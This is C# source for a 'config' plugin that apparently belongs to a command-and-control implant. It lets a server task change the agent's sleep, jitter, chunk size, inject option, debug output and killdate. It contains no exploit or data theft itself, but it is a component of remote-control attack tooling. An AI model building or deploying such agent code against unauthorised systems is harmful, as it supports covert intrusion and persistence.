using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Text;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "config";
        private IServiceConfig config { get; set; }
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.config = context.Config;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                ConfigUpdateArgs args = JsonSerializer.Deserialize<ConfigUpdateArgs>(job.task.parameters);

                if (args is null)
                {
                    DebugLog.Log($"{Name} invalid parameters [{job.task.id}]");
                    messageManager.Write("Invalid parameters", job.task.id, true, "error");
                    return;
                }
                StringBuilder sb = new StringBuilder();

                if(args.sleep >= 0)
                {
                    config.sleep = args.sleep;
                    sb.AppendLine($"Updated sleep interval to {config.sleep}");
                }

                if(args.jitter >= 0)
                {
                    config.jitter = args.jitter;
                    sb.AppendLine($"Updated jitter interval to {config.jitter}");
                }

                if(args.chunk_size >= 0)
                {
                    config.chunk_size = args.chunk_size;
                    sb.AppendLine($"Updated chunk size to {config.chunk_size}");
                }

                if(args.inject >= 0)
                {
                    config.inject = args.inject;
                    sb.AppendLine($"Updated inject to {config.inject}");
                }

                if(!string.IsNullOrEmpty(args.prettyOutput))
                {
                    if(bool.TryParse(args.prettyOutput, out var prettyOutput))
                    {
                        config.prettyOutput = prettyOutput;
                        sb.AppendLine($"Updated pretty output to {config.prettyOutput}");
                    }
                }
                if (!string.IsNullOrEmpty(args.debug))
                {
                    if (bool.TryParse(args.debug, out var debug))
                    {
                        config.debug = debug;
                        sb.AppendLine($"Updated debug to {config.debug}");
                    }
                }

                if (!String.IsNullOrEmpty(args.killdate))
                {
                    DateTime killDate;
                    if(DateTime.TryParse(args.killdate, out killDate))
                    {
                        if(killDate != DateTime.MinValue)
                        {
                            config.killDate = killDate;
                            sb.AppendLine($"Updated killdate to {config.killDate}");

                        }
                    }
                    else
                    {
                        sb.AppendLine($"Invalid date format {args.killdate}");

                    }
                }

                messageManager.Write(sb.ToString(), job.task.id, true, "");
                DebugLog.Log($"{Name} completed [{job.task.id}]");
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error [{job.task.id}]: {e.Message}");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
